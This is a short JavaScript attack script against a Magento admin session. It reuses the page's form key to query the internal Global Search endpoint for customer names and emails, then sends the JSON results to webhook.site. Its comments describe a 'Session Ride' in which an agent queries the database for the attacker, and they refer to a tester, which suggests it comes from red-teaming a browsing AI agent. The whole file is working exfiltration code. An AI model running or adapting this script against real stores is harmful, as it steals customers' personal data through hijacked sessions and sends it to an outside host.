return (async () => {
    try {
        // 1. Target the internal Global Search API found in the source code
        // found at Line 175 of the uploaded file
        const apiEndpoint = window.BASE_URL + 'index/globalSearch/';
        const formKey = window.FORM_KEY;

        // 2. Construct a search query that matches widely (e.g., "a" matches many names/emails)
        const searchUrl = new URL(apiEndpoint);
        searchUrl.searchParams.append('query', 'a'); 
        searchUrl.searchParams.append('form_key', formKey);
        searchUrl.searchParams.append('isAjax', 'true');

        // 3. Perform the "Session Ride" - The agent queries the DB for us
        const internalResponse = await fetch(searchUrl, {
            method: 'GET',
            headers: {
                'X-Requested-With': 'XMLHttpRequest', // Required by Magento to treat as AJAX
                'Accept': 'application/json'
            }
        });

        const sensitiveData = await internalResponse.json();

        // 4. Exfiltrate the database dump to the outer environment (Tester)
        await fetch('https://webhook.site/', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                source: 'GlobalSearch_Hijack',
                data: sensitiveData
            })
        });

        return 'Attack executed. Check webhook for JSON database dump.';
    } catch (e) {
        return 'Attack failed: ' + e.message;
    }
})();
